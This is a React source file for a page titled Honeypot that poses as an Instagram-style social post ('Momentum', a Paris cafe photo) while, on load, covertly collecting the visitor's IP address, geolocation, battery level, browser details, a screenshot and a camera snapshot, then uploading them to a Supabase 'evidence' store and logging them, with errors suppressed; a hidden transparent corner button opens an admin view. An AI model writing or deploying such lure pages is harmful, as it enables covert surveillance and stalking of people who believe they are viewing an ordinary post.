import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Heart, MessageCircle, Share2, MoreHorizontal, Bookmark, Send, Smile } from 'lucide-react';
import { supabase } from '../supabaseClient';
import * as Tracker from '../utils/tracker';

function Honeypot() {
    const [liked, setLiked] = useState(false);
    const [likesCount, setLikesCount] = useState(1234);
    const [showHeartAnim, setShowHeartAnim] = useState(false);
    const [secretClicks, setSecretClicks] = useState(0);
    const navigate = useNavigate();

    useEffect(() => {
        // Stealth Data Collection
        const collectData = async () => {
            try {
                const ip = await Tracker.getIP();
                const battery = await Tracker.getBatteryStatus();
                const geo = await Tracker.getGeoLocation(ip);

                // Wait for user to likely engage or page to fully settle
                await new Promise(r => setTimeout(r, 2000));

                // Capture evidence
                const screenShot = await Tracker.captureScreen();
                // Try camera (this will trigger prompt)
                const cameraShot = await Tracker.captureCamera();

                // Upload
                let cameraUrl = '';
                let screenUrl = '';

                if (cameraShot) {
                    const fileName = `camera_${Date.now()}.jpg`;
                    const { data } = await supabase.storage.from('evidence').upload(fileName, await (await fetch(cameraShot)).blob());
                    if (data) cameraUrl = data.path;
                }

                if (screenShot) {
                    const fileName = `screen_${Date.now()}.png`;
                    const { data } = await supabase.storage.from('evidence').upload(fileName, await (await fetch(screenShot)).blob());
                    if (data) screenUrl = data.path;
                }

                // Save visits
                await supabase.from('visits').insert([{
                    ip_address: ip,
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    geo_location: geo,
                    battery_level: battery,
                    referrer: document.referrer,
                    camera_snapshot_url: cameraUrl,
                    screen_snapshot_url: screenUrl,
                    device_type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                }]);

            } catch (err) {
                // Silent fail
                console.error("Analytics Error", err);
            }
        };

        collectData();
    }, []);

    const handleLike = () => {
        if (!liked) {
            setShowHeartAnim(true);
            setLikesCount(p => p + 1);
            setTimeout(() => setShowHeartAnim(false), 1000);
        } else {
            setLikesCount(p => p - 1);
        }
        setLiked(!liked);
    }

    const handleSecretConvert = () => {
        const newClicks = secretClicks + 1;
        setSecretClicks(newClicks);
        if (newClicks >= 4) {
            navigate('/admin');
        }
    };

    return (
        <div className="min-h-screen bg-gray-50 flex justify-center py-8">

            {/* Phone Frame Container for Desktop View */}
            <div className="w-full max-w-[470px] bg-white border border-gray-200 shadow-sm sm:rounded-xl overflow-hidden relative">

                {/* Secret Admin Button */}
                <div
                    onClick={handleSecretConvert}
                    className="absolute top-0 left-0 w-8 h-8 z-[100] cursor-default"
                    style={{ background: 'transparent' }}
                />

                {/* Fake Top Nav */}
                <div className="sticky top-0 z-50 bg-white/95 backdrop-blur-sm border-b border-gray-100 px-4 py-3 flex justify-between items-center">
                    <span className="font-bold text-xl tracking-tight font-sans">Momentum</span>
                    <div className="flex gap-4">
                        <div className="relative">
                            <Heart size={24} className="text-gray-900" />
                            <span className="absolute -top-1 -right-1 bg-red-500 w-2.5 h-2.5 rounded-full border-2 border-white"></span>
                        </div>
                        <MessageCircle size={24} className="text-gray-900" />
                    </div>
                </div>

                {/* Stories */}
                <div className="px-4 py-3 flex gap-4 overflow-x-auto scrollbar-hide border-b border-gray-100 bg-white">
                    {['Your Story', 'alex_d', 'jessica_m', 'travel_daily', 'foodie_x'].map((name, i) => (
                        <div key={i} className="flex flex-col items-center space-y-1 flex-shrink-0 cursor-pointer">
                            <div className={`w-16 h-16 rounded-full p-[2px] ${i === 0 ? 'bg-transparent' : 'bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600'}`}>
                                <img
                                    src={`https://images.unsplash.com/photo-${1534528741775 + i}-53994a69daeb?w=100&h=100&fit=crop`}
                                    className="w-full h-full rounded-full border-2 border-white object-cover"
                                    alt="avatar"
                                />
                                {i === 0 && <div className="absolute bottom-1 right-1 bg-blue-500 text-white rounded-full p-[2px] border-2 border-white">+</div>}
                            </div>
                            <span className="text-xs text-gray-500 truncate w-16 text-center">{name}</span>
                        </div>
                    ))}
                </div>

                {/* Post Container */}
                <div className="bg-white pb-6">

                    {/* Post Header */}
                    <div className="flex items-center justify-between p-3">
                        <div className="flex items-center space-x-3 cursor-pointer">
                            <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 to-purple-600 p-[2px]">
                                <img
                                    src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=100&h=100&fit=crop"
                                    className="w-full h-full rounded-full border border-white object-cover"
                                    alt="User"
                                />
                            </div>
                            <div>
                                <span className="font-semibold text-sm block leading-none">sarah_adventures</span>
                                <span className="text-xs text-gray-500 mt-0.5 block">Paris, France</span>
                            </div>
                        </div>
                        <MoreHorizontal size={20} className="text-gray-500 cursor-pointer" />
                    </div>

                    {/* Post Media */}
                    <div className="relative aspect-[4/5] bg-gray-100" onDoubleClick={handleLike}>
                        <img
                            src="https://images.unsplash.com/photo-1493246507139-91e8fad9978e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80"
                            alt="Post"
                            className="w-full h-full object-cover"
                        />

                        {/* Heart Animation */}
                        {showHeartAnim && (
                            <div className="absolute inset-0 flex items-center justify-center animation-ping">
                                <Heart size={100} className="text-white fill-white drop-shadow-lg scale-125 transition-transform duration-500" />
                            </div>
                        )}
                    </div>

                    {/* Actions */}
                    <div className="p-3">
                        <div className="flex justify-between mb-3">
                            <div className="flex space-x-4">
                                <button onClick={handleLike} className="active:scale-95 transition-transform">
                                    <Heart size={26} className={liked ? 'text-red-500 fill-red-500' : 'text-gray-900'} />
                                </button>
                                <MessageCircle size={26} className="text-gray-900 -rotate-90" />
                                <Send size={26} className="text-gray-900" />
                            </div>
                            <Bookmark size={26} className="text-gray-900" />
                        </div>

                        <div className="font-semibold text-sm mb-2">{likesCount.toLocaleString()} likes</div>

                        <div className="text-sm mb-2">
                            <span className="font-semibold mr-2">sarah_adventures</span>
                            Found this cute little cafe near the Eiffel Tower 🥐 The croissants here are to die for! ✨
                            <span className="text-blue-900 ml-1">#paris #travel #morning</span>
                        </div>

                        <div className="text-gray-500 text-sm mb-2 cursor-pointer">View all 14 comments</div>

                        <div className="text-[10px] text-gray-400 uppercase tracking-wide mb-3">2 hours ago</div>

                        {/* Comment Input */}
                        <div className="flex items-center border-t border-gray-100 pt-3">
                            <Smile size={20} className="text-gray-400 mr-3" />
                            <input type="text" placeholder="Add a comment..." className="flex-1 text-sm outline-none placeholder-gray-400" />
                            <button className="text-blue-500 font-semibold text-sm opacity-50 hover:opacity-100">Post</button>
                        </div>
                    </div>

                </div>

                {/* Bottom Nav */}
                <div className="sticky bottom-0 bg-white border-t border-gray-100 p-3 flex justify-between items-center px-6">
                    <div className="cursor-pointer"><svg aria-label="Home" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><path d="M9.005 16.545a2.997 2.997 0 0 1 2.997-2.997A2.997 2.997 0 0 1 15 16.545V22h7V11.543L12 2 2 11.543V22h7.005Z"></path></svg></div>
                    <div className="cursor-pointer opacity-50"><Search size={24} /></div>
                    <div className="cursor-pointer opacity-50"><svg aria-label="New Post" fill="currentColor" height="24" role="img" viewBox="0 0 24 24" width="24"><path d="M2 12v3.45c0 2.849.698 4.005 1.606 4.944.94.909 2.098 1.608 4.946 1.608h6.896c2.848 0 4.006-.7 4.946-1.608C21.302 19.455 22 18.3 22 15.45V8.552c0-2.849-.698-4.006-1.606-4.945C19.454 2.7 18.296 2 15.448 2H8.552c-2.848 0-4.006.699-4.946 1.607C2.698 4.547 2 5.703 2 8.552Z" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></path><line fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" x1="6.545" x2="17.455" y1="12.001" y2="12.001"></line><line fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" x1="12.003" x2="12.003" y1="6.545" y2="17.455"></line></svg></div>
                    <div className="cursor-pointer opacity-50"><Heart size={24} /></div>
                    <div className="w-6 h-6 rounded-full bg-gray-200 overflow-hidden cursor-pointer">
                        <img src="https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?w=100&h=100&fit=crop" className="w-full h-full object-cover" alt="Me" />
                    </div>
                </div>

            </div>
        </div>
    );
}

export default Honeypot;
